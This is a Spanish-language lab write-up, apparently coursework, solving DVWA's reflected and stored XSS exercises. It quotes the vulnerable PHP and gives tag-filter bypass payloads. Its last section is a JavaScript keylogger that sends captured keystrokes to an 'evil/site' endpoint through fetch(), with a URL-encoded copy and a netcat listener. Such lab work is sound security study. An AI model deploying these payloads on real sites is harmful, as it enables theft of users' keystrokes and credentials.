# Ejercicio 5

En todos los ejercicios suponga que las BWA estan levantada en 192.168.1.20

## XSS reflected

### Easy version

Mirando el codigo, vemos que no hay ningun tipo de sanitizer

```
 <?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {
        
 echo '<pre>';
 echo 'Hello ' . $_GET['name'];
 echo '</pre>';
    
}

?> 
```

Esto nos permite hacer XSS simplemente ingresando a:
`http://192.168.1.20/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>`

### Medium version

El nuevo codigo, evita que mandemos el tag `<script>`

```
 <?php

if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){

 $isempty = true;

} else {

 echo '<pre>';
 echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
 echo '</pre>'; 

}

?> 
```

Pero de nuevo, podemos mandar tranquilamente el tag con un espacio en el medio `http://192.168.1.20/dvwa/vulnerabilities/xss_r/?name=<script >alert(1)</script>`

### Hard version

El nuevo codigo pareciera estar escapando los caracteres especiales de HTML
```
 <?php
    
if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
    
 $isempty = true;
        
} else {
    
 echo '<pre>';
 echo 'Hello ' . htmlspecialchars($_GET['name']);
 echo '</pre>';
        
}

?> 
```

Leyendo la documentacion, vemos que la funcion convierte:

| Symbol   |      Replacement      |
|:----------:|:-------------:|
| & | \&amp; |
| " | \&quot; |
| ' | \&#039; or \&apos; |
| < | \&lt; |
| > | \&gt; |

De igual manera, el caracter `'` solo se reemplaza cuando la flag ` ENT_QUOTES` esta seteada, asi que deberiamos buscar algo con este caracter

Me parece que esto no se puede romper con HTML, pero seria vulnerable a SQL injection en todo caso, ya que podemos usar `'` y `\` (ya que no hay un `strip_slashes`)

Capaz igual estoy equivocado, sigo pensando

## XSS stored

### Easy version

Mirando el codigo, vemos que se hace un `INSERT` en una tabla de la DB. Se hace el escaping correspondiente para evitar sql-injections.

```
 <?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?> 
```

De igual manera, el string `<script>X</script>` deberian sobrevivir sin problemas, y guardarse en la DB. Entonces, cada vez que alguien carge una pagina que muestre resultados, se ejecutara el script X

Mandamos entonces: 
> name: asd

> message: \<script>alert(1)\</script>

### Medium version

La diferencia con el codigo anterior es que ahora en el mensaje se aplica un buen escaping (`strip_tags` + `htmlespecialchars`), pero porque no al nombre?

```
 <?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = trim(strip_tags(addslashes($message)));
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);
    
   // Sanitize name input
   $name = str_replace('<script>', '', $name);
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?> 
```

Desde el front-end, podemos comprobar que no nos deja escribir algo tan largo... Se ve que confian en eso. Lamentablemente tenemos el codigo, y sabemos que es una request POST a la misma url. Solo nos queda ver como superamos la linea `$name = str_replace('<script>', '', $name);`

Si le ponemos un espacio antes del `>` (como antes), tiene el mismo efecto el tag, por lo tanto, usando un proxy, reemplazamos:
> name = \<script >alert(1); \</script>

### Hard version

No pareciera ser rompible, pero pensando aun


# Leakear los keystrokes del usuario

Codigo para atrapar las keys del user

```
<script>
var keys = '';
 
document.onkeypress = function(e) {
   var get = window.event ? event : e;
   var key = get.keyCode ? get.keyCode : get.charCode;
   key = String.fromCharCode(key);
   keys += key;
}
 
window.setInterval(function(){
   fetch('http://localhost:1337/evil/site?key=' + keys);
   keys = '';
}, 5000);
</script>
```

En vez de mandar `alert(1)`, podemos mandar el url encode del codigo de arriba, por ejemplo

`
http://192.168.1.20/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3E%0Avar%20keys%20%3D%20%27%27%3B%0A%20%0Adocument%2Eonkeypress%20%3D%20function%28e%29%20%7B%0A%20%20%20var%20get%20%3D%20window%2Eevent%20%3F%20event%20%3A%20e%3B%0A%20%20%20var%20key%20%3D%20get%2EkeyCode%20%3F%20get%2EkeyCode%20%3A%20get%2EcharCode%3B%0A%20%20%20key%20%3D%20String%2EfromCharCode%28key%29%3B%0A%20%20%20keys%20%2B%3D%20key%3B%0A%7D%0A%20%0Awindow%2EsetInterval%28function%28%29%7B%0A%20%20%20fetch%28%27http%3A%2F%2Flocalhost%3A1337%2Fevil%2Fsite%3Fkey%3D%27%20%2B%20keys%29%3B%0A%20%20%20keys%20%3D%20%27%27%3B%0A%7D%2C%205000%29%3B%0A%3C%2Fscript%3E
`

(Puede abrir escuchar la request haciendo `nc -lvp 1337`)

Este ataque aplica a cualquier ataque detallado arriba